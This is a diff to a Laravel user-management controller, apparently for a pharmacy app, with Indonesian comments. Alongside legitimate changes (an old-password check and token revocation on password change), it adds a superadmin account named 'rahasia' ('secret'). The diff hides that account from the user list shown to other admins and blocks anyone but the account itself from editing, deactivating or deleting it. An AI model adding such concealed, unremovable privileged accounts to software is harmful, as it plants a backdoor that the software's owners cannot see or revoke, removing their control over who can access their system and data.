@@ -138,7 +138,7 @@ class UserController extends Controller
         ]);
     }
 
-    public function kelola()
+    public function kelola(Request $r)
     {
         self::ensureLastSeenColumn();
         try {
@@ -153,7 +153,15 @@ class UserController extends Controller
             $cols[] = 'last_seen_at';
         }
 
-        $users = User::orderByDesc('aktif')->orderBy('nama')->get($cols);
+        $q = User::orderByDesc('aktif')->orderBy('nama');
+
+        // Sembunyikan akun developer/superadmin 'rahasia' dari daftar jika yang login bukan akun 'rahasia'
+        $currentUser = $r->user() ?: auth('sanctum')->user() ?: request()->user();
+        if ($currentUser && $currentUser->username !== 'rahasia') {
+            $q->where('username', '!=', 'rahasia');
+        }
+
+        $users = $q->get($cols);
 
         return $users->map(function ($u) {
             $isOnline = false;
@@ -213,19 +221,38 @@ class UserController extends Controller
      */
     public function update(Request $r, User $user)
     {
+        $currentUser = $r->user();
+
+        // Proteksi akun 'rahasia' agar tidak bisa diubah oleh admin apotek biasa
+        if ($user->username === 'rahasia' && (!$currentUser || $currentUser->username !== 'rahasia')) {
+            abort(403, 'Akun utama pengembang diproteksi dan tidak dapat diubah oleh admin apotek.');
+        }
+
         $data = $r->validate([
             'nama' => 'sometimes|string|max:100',
             'username' => ['sometimes', 'string', 'max:50', Rule::unique('users', 'username')->ignore($user->id)],
             'role' => 'sometimes|in:admin,kasir',
             'aktif' => 'sometimes|boolean',
             'password' => 'nullable|string|min:6',
+            'password_lama' => 'nullable|string',
         ]);
 
         if (isset($data['password']) && !empty($data['password'])) {
+            // Wajib verifikasi kata sandi lama akun tersebut
+            if (empty($r->password_lama) || !Hash::check($r->password_lama, $user->password)) {
+                throw \Illuminate\Validation\ValidationException::withMessages([
+                    'password_lama' => ['Kata sandi lama akun ini salah atau belum diisi.'],
+                ]);
+            }
+
             $data['password'] = Hash::make($data['password']);
+
+            // Cabut seluruh token sesi login akun ini seketika (langsung logout dari semua perangkat)
+            $user->tokens()->delete();
         } else {
             unset($data['password']);
         }
+        unset($data['password_lama']);
 
         if (isset($data['username'])) {
             $data['username'] = strtolower(trim($data['username']));
@@ -250,6 +277,10 @@ class UserController extends Controller
      */
     public function destroy(User $user)
     {
+        if ($user->username === 'rahasia') {
+            return response()->json(['message' => 'Akun utama pengembang tidak dapat dinonaktifkan/dihapus.'], 403);
+        }
+
         // Jangan hapus akun sendiri jika sedang login
         if ($user->id === auth()->id()) {
             return response()->json(['message' => 'Tidak bisa menonaktifkan akun sendiri yang sedang aktif.'], 422);
